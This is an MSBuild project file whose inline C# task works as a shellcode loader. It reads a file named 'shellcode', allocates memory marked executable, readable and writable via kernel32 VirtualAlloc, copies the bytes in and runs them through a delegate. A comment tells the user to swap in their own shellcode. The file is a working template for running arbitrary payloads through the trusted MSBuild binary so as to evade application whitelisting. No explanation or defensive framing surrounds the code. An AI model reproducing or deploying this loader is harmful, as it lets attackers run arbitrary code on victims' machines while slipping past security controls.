<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
	<Target Name="Hello">
		<RunMe123 />
	</Target>
	<UsingTask
	  TaskName="RunMe123"
	  TaskFactory="CodeTaskFactory"
	  AssemblyFile="$(MSBuildToolsPath)\Microsoft.Build.Tasks.v4.0.dll" >
		<Task>

			<Code Type="Class" Language="cs">
				<![CDATA[
		using System;
		using System.IO;
		using System.Runtime.InteropServices;
		using Microsoft.Build.Framework;
		using Microsoft.Build.Utilities;
		public class RunMe123 : Task, ITask
		{
			private static UInt32 MEM_COMMIT = 0x1000;
			private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;
			[DllImport("kernel32")]
			private static extern IntPtr VirtualAlloc(IntPtr lpStartAddr,
			  UInt32 size, UInt32 flAllocationType, UInt32 flProtect);
			[DllImport("kernel32")]
			private static extern IntPtr CreateThread(
			  UInt32 lpThreadAttributes,
			  UInt32 dwStackSize,
			  IntPtr lpStartAddress,
			  IntPtr param,
			  UInt32 dwCreationFlags,
			  ref UInt32 lpThreadId
			  );
			[DllImport("kernel32")]
			private static extern UInt32 WaitForSingleObject(
			  IntPtr hHandle,
			  UInt32 dwMilliseconds
			  );

			[UnmanagedFunctionPointer(CallingConvention.StdCall)]
			delegate void WindowRun();

			public override bool Execute()
			{
				//replace with your own shellcode
				string filepath = @"shellcode";
				byte[] shellcode = File.ReadAllBytes(filepath);
				IntPtr funcAddr = VirtualAlloc(IntPtr.Zero, (UInt32)shellcode.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
				Marshal.Copy(shellcode, 0, funcAddr, shellcode.Length);
				IntPtr hThread = IntPtr.Zero;
				UInt32 threadId = 0;
				IntPtr pinfo = IntPtr.Zero;
				WindowRun r = Marshal.GetDelegateForFunctionPointer<WindowRun>(funcAddr);
				r();
				return true;
			}
		}
	      ]]>
			</Code>
		</Task>
	</UsingTask>
</Project>
